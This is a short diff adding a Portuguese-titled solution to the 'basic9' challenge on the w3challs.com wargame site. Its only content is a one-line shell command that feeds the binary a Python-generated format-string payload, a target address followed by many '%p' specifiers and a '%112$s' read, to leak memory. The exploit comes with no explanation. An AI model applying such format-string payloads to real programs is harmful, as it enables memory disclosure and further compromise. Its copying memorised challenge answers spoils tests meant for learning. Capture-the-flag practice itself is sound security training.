@@ -1,0 +1,3 @@
+Resolução basic9, w3challs.com:
+
+exec -a $(python -c 'print "\x40\x99\x04\x08_____" + "%p"*112 + "%112$s"') ./basic9 3
